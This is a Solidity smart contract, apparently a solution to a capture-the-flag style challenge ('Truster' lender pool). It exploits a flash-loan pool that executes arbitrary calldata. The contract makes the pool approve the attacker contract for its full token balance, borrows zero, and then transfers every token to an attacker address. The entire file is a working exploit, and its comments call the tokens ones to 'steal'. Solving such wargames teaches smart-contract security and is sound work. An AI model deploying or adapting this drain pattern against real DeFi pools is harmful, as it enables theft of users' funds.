// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface TrusterLenderPoolInterface{
  function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterLenderPoolExploiter {
    address lenderPool;

    constructor(address lenderPool_){
        lenderPool = lenderPool_;
    }

    /**
     * @notice  Start the exploit
     * @param   borrower The borrower address
     * @param   attackerAddress Attacker adress
     * @param   token Token to steal
     */
    function startExploit(
        address borrower,
        address attackerAddress,
        IERC20 token
    ) external {
        uint256 tokenAmount = token.balanceOf(lenderPool);
        // Here we use address(this) instead of lenderPool as in the function call we will be
        // in the context of the lenderPool contract
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), tokenAmount);
        // We use 0 as borrowAmount to not have to repay anything
        TrusterLenderPoolInterface(lenderPool).flashLoan(0, borrower, address(token), data);
        token.transferFrom(lenderPool, attackerAddress, tokenAmount);
    }
}